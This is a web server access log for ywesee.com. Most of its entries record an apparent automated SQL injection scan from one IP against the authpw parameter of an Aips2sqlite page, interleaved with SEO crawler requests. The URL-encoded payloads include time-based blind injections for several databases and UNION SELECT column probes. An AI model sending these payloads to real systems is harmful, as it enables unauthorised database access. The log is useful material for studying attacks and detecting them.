18.204.244.43 - - [11/Jan/2022:14:53:38 +0100] "GET /bIH3J6zmSLA/6DZ4sRtBV7He/qDYWxE6pTr9/SdBazHvXY2GUS/w2aYjTYCsMXPptdsz7rN HTTP/1.1" 404 330 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:38 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 9397 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.230.219.226 - - [11/Jan/2022:14:53:38 +0100] "GET /.well-known/security.txt HTTP/1.1" 404 283 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
3.228.230.254 - - [11/Jan/2022:14:53:38 +0100] "GET / HTTP/1.1" 200 10387 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
54.157.240.233 - - [11/Jan/2022:14:53:38 +0100] "GET / HTTP/1.1" 200 10387 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:39 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 9403 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.230.219.226 - - [11/Jan/2022:14:53:39 +0100] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:39 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 9400 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.228.230.254 - - [11/Jan/2022:14:53:39 +0100] "GET /pub/skins/ywesee/gila.css HTTP/1.1" 200 8276 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
3.228.230.254 - - [11/Jan/2022:14:53:39 +0100] "GET /uploads/Main/yweseelogo.gif HTTP/1.1" 200 2982 "https://ywesee.com/" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
54.157.240.233 - - [11/Jan/2022:14:53:39 +0100] "GET /pub/skins/ywesee/gila.css HTTP/1.1" 200 8276 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
54.157.240.233 - - [11/Jan/2022:14:53:39 +0100] "GET /uploads/Main/yweseelogo.gif HTTP/1.1" 200 2982 "https://ywesee.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:39 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 9403 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.230.219.226 - - [11/Jan/2022:14:53:39 +0100] "GET /sitemap_index.xml HTTP/1.1" 404 276 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
3.230.219.226 - - [11/Jan/2022:14:53:39 +0100] "GET /sitemap.xml.gz HTTP/1.1" 404 273 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
3.230.219.226 - - [11/Jan/2022:14:53:40 +0100] "GET /sitemap.xml HTTP/1.1" 404 270 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:40 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:40 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 9399 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:40 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 9405 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.228.230.254 - - [11/Jan/2022:14:53:40 +0100] "HEAD /favicon.ico HTTP/1.1" 200 - "https://ywesee.com/" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:41 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:41 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 9405 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:41 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 9411 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 9408 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.228.230.254 - - [11/Jan/2022:14:53:42 +0100] "HEAD /favicon.ico HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 9414 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 9411 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 9414 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:43 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2898%29%7C%7CCHR%28121%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 9500 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:43 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2898%29%7C%7CCHR%28121%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 9497 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
107.21.221.94 - - [11/Jan/2022:14:53:43 +0100] "GET / HTTP/1.1" 200 10387 "-" "Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4590.2 Mobile Safari/537.36 Chrome-Lighthouse (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:44 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2898%29%7C%7CCHR%28121%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 9503 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:44 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2898%29%7C%7CCHR%28121%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 9500 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
107.21.221.94 - - [11/Jan/2022:14:53:44 +0100] "GET /pub/skins/ywesee/gila.css HTTP/1.1" 200 8276 "-" "Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4590.2 Mobile Safari/537.36 Chrome-Lighthouse (compatible; woorankreview/2.0; +https://www.woorank.com/)"
107.21.221.94 - - [11/Jan/2022:14:53:44 +0100] "GET /uploads/Main/yweseelogo.gif HTTP/1.1" 200 2982 "https://ywesee.com/" "Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4590.2 Mobile Safari/537.36 Chrome-Lighthouse (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:44 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2898%29%7C%7CCHR%28121%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 9503 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:45 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20AND%20SLEEP%285%29%20AND%20%283098%3D3098 HTTP/1.1" 200 9417 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:45 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%20SLEEP%285%29 HTTP/1.1" 200 9391 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:45 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%20SLEEP%285%29--%20rPSH HTTP/1.1" 200 9400 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:46 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20AND%20SLEEP%285%29%20AND%20%28%27RZwT%27%3D%27RZwT HTTP/1.1" 200 9429 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:46 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20AND%20SLEEP%285%29%20AND%20%27pfgc%27%3D%27pfgc HTTP/1.1" 200 9423 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:46 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 9421 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:47 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29%20AND%20%286126%3D6126 HTTP/1.1" 200 9456 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:47 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1" 200 9430 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:47 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29--%20grlu HTTP/1.1" 200 9439 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:48 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27Iome%27%3D%27Iome HTTP/1.1" 200 9468 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:48 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29%20AND%20%27AaoZ%27%3D%27AaoZ HTTP/1.1" 200 9462 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:48 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20AND%209234%3D%28SELECT%209234%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 9460 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:49 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%288474%3D8474 HTTP/1.1" 200 9432 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:49 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1" 200 9406 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:49 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20vnDz HTTP/1.1" 200 9415 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:50 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27xXEa%27%3D%27xXEa HTTP/1.1" 200 9444 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:50 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27WRYc%27%3D%27WRYc HTTP/1.1" 200 9438 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.230.219.226 - - [11/Jan/2022:14:53:50 +0100] "GET / HTTP/1.1" 200 10387 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:50 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 9436 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
3.230.219.226 - - [11/Jan/2022:14:53:50 +0100] "GET / HTTP/1.1" 200 10387 "-" "Mozilla/5.0 (compatible; woorankreview/2.0; +https://www.woorank.com/)"
45.227.254.4 - - [11/Jan/2022:14:53:51 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29%20AND%20%282546%3D2546 HTTP/1.1" 200 9512 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:51 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29 HTTP/1.1" 200 9486 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:51 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29--%20tjdl HTTP/1.1" 200 9495 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:51 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29%20AND%20%28%27rPsB%27%3D%27rPsB HTTP/1.1" 200 9524 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:52 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29%20AND%20%27qnRO%27%3D%27qnRO HTTP/1.1" 200 9518 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:52 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20AND%202872%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28122%29%7C%7CCHR%28121%29%7C%7CCHR%28102%29%2C5%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 9516 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:53 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20ORDER%20BY%201--%20aiwB HTTP/1.1" 200 9399 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:53 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20ORDER%20BY%205692--%20xkEb HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:54 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL--%20HubA HTTP/1.1" 200 9412 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:55 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20BmEH HTTP/1.1" 200 9419 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:55 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20fWEV HTTP/1.1" 200 9426 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:56 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20TAYR HTTP/1.1" 200 9433 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:57 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20tyhy HTTP/1.1" 200 9440 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:58 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20iYGn HTTP/1.1" 200 9447 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:58 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20nnMs HTTP/1.1" 200 9454 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:53:59 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20gwLL HTTP/1.1" 200 9461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
